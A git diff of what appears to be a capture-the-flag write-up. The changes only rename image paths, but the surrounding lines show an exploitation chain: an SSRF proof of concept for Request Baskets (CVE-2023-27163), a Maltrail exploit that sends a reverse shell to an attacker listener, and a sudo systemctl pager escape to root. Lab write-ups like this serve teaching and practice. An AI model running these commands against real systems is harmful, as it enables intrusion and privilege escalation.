@@ -86,13 +86,13 @@ The HTTP response headers don't say much, the nmap scan did say the website was 
 feroxbuster -u http://10.129.229.26:55555
 ```
 
-<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Again nothing that catches our eye yet
 
 #### <mark style="color:$primary;">Site</mark>
 
-<figure><img src="../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The footer of the home page reveals a version for the software
 
@@ -102,7 +102,7 @@ A quick google search brings me to this article that reveals an SSRF in this ver
 
 {% embed url="https://medium.com/@li_allouche/request-baskets-1-2-1-server-side-request-forgery-cve-2023-27163-2bab94f201f7" %}
 
-<figure><img src="../../.gitbook/assets/image (5) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 #### <mark style="color:$primary;">Exploitation</mark>
 
@@ -114,11 +114,11 @@ I Found a POC on Github
 ./CVE-2023-27163.sh http://10.129.229.26:55555 http://127.0.0.1:8338
 ```
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 It created a basket and gave us a URL we can visit&#x20;
 
-<figure><img src="../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (8) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Visiting the newly created bucket revealed a page that provides us with a version for Maltrail
 
@@ -169,7 +169,7 @@ Clone the repo, prep a listener, than run the command on the SSRF url
 python exploit.py 10.10.16.15 443 http://10.129.229.26:55555/ntencd
 ```
 
-<figure><img src="../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (9) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 We got a shell as the puma user
 
@@ -179,7 +179,7 @@ We got a shell as the puma user
 
 #### <mark style="color:$primary;">SUDO systemctl → spawns pager (less) → shell escape</mark>
 
-<figure><img src="../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 The puma user can run some `systemctl` commands as root without a password using `sudo`
 
